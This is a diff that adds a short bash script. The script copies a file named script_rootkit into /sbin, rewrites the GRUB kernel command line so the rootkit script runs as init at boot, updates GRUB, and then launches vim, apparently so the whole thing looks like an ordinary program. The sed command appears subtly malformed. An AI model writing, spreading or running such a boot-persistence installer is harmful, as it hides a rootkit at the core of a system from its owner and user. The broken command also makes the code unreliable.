@@ -1,0 +1,10 @@
+#!/bin/bash
+
+#copy script_rootkit.sh to /sbin/
+#append "init=/sbin/script_rootkit.sh" to the line in /etc/default/grub beginning with linux
+#just exec a normal ahh programme
+
+cp ./script_rootkit /sbin/script_rootkit.sh
+sed -i 's^\(GRUB_CMDLINE_LINUX_DEFAULT=".*\)"/\1 init=\/sbin\/script_rootkit.sh"/' "/etc/default/grub"
+update-grub
+exec vim 
